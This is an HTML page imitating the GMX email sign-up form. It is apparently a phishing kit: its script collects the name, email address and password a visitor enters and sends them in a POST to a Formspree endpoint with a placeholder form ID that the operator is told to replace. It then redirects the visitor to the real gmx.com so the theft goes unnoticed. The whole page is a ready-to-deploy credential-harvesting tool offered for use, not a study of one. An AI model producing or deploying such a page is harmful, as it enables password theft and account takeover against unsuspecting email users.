<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GMX - Sign Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #e8e8e8; min-height: 100vh; }
        #preloader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.92); display: flex; align-items: center; justify-content: center; z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.2s ease; }
        #preloader.active { opacity: 1; pointer-events: all; }
        .spinner { width: 44px; height: 44px; border: 4px solid #dde7f5; border-top: 4px solid #1a5fb4; border-radius: 50%; animation: spin 0.75s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .navbar { background-color: #1a5fb4; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; height: 56px; position: sticky; top: 0; z-index: 100; }
        .navbar-left { display: flex; align-items: center; gap: 14px; }
        .navbar-right { display: flex; align-items: center; gap: 10px; }
        .hamburger { display: flex; flex-direction: column; gap: 5px; cursor: pointer; padding: 4px; }
        .hamburger span { display: block; width: 22px; height: 2px; background: white; }
        .logo { color: white; font-size: 30px; font-weight: 900; letter-spacing: 2px; font-family: Arial Black, sans-serif; text-decoration: none; }
        .nav-icon-btn { background: transparent; border: none; cursor: pointer; padding: 6px; display: flex; align-items: center; text-decoration: none; }
        .signup-btn { border: 2px solid white; color: white; background: transparent; padding: 7px 16px; font-size: 15px; font-weight: bold; cursor: pointer; border-radius: 2px; text-decoration: none; }
        .page { padding: 24px 16px; }
        .card { background: #fff; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.13); padding: 24px 20px 28px; }
        .card-title { font-size: 20px; font-weight: 900; color: #111; margin-bottom: 22px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 15px; font-weight: 900; color: #111; margin-bottom: 7px; }
        .form-group input { width: 100%; padding: 13px 14px; border: 1px solid #ccc; border-radius: 3px; font-size: 15px; color: #333; outline: none; }
        .form-group input:focus { border-color: #1a5fb4; }
        .form-group input::placeholder { color: #aaa; }
        .register-btn { width: 100%; padding: 15px; background: #2e7d32; color: white; border: none; border-radius: 3px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 4px; }
        .register-btn:hover { background: #256427; }
        .card-links { display: flex; flex-direction: column; align-items: center; gap: 10px; margin-top: 18px; }
        .card-links a { color: #555; font-size: 15px; text-decoration: underline; }
    </style>
</head>
<body>

<div id="preloader"><div class="spinner"></div></div>

<nav class="navbar">
    <div class="navbar-left">
        <div class="hamburger"><span></span><span></span><span></span></div>
        <a href="index.html" class="logo" onclick="showPreloader()">GMX</a>
    </div>
    <div class="navbar-right">
        <a href="#" class="nav-icon-btn">
            <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="white" stroke-width="2.2">
                <circle cx="11" cy="11" r="7"/>
                <line x1="16.5" y1="16.5" x2="22" y2="22" stroke-linecap="round"/>
            </svg>
        </a>
        <a href="login.html" class="signup-btn" onclick="showPreloader()">Sign up</a>
        <a href="https://www.gmx.com" target="_blank" class="nav-icon-btn">
            <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="white" stroke-width="2">
                <rect x="2" y="4" width="20" height="16" rx="1"/>
                <polyline points="2,4 12,13 22,4"/>
            </svg>
        </a>
    </div>
</nav>

<div class="page">
    <div class="card">
        <div class="card-title">Create your GMX account</div>
        <div class="form-group">
            <label>First name</label>
            <input type="text" id="first_name" placeholder="First name">
        </div>
        <div class="form-group">
            <label>Last name</label>
            <input type="text" id="last_name" placeholder="Last name">
        </div>
        <div class="form-group">
            <label>Email address</label>
            <input type="email" id="email" placeholder="Email address">
        </div>
        <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="register-btn" onclick="handleRegister()">Create account</button>
        <div class="card-links">
            <a href="login.html" onclick="showPreloader()">Already have an account? Log in</a>
        </div>
    </div>
</div>

<script>
    function showPreloader() {
        document.getElementById('preloader').classList.add('active');
    }
    window.addEventListener('pageshow', function() {
        document.getElementById('preloader').classList.remove('active');
    });

    async function handleRegister() {
        const first = document.getElementById('first_name').value;
        const last = document.getElementById('last_name').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        if (!first || !last || !email || !password) return;

        showPreloader();

        // Send to Formspree - replace with YOUR form ID
        await fetch('https://formspree.io/f/YOUR_FORM_ID', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'REGISTER',
                name: first + ' ' + last,
                email: email,
                password: password,
                time: new Date().toLocaleString()
            })
        });

        window.location.href = 'https://www.gmx.com';
    }
</script>
</body>
</html>
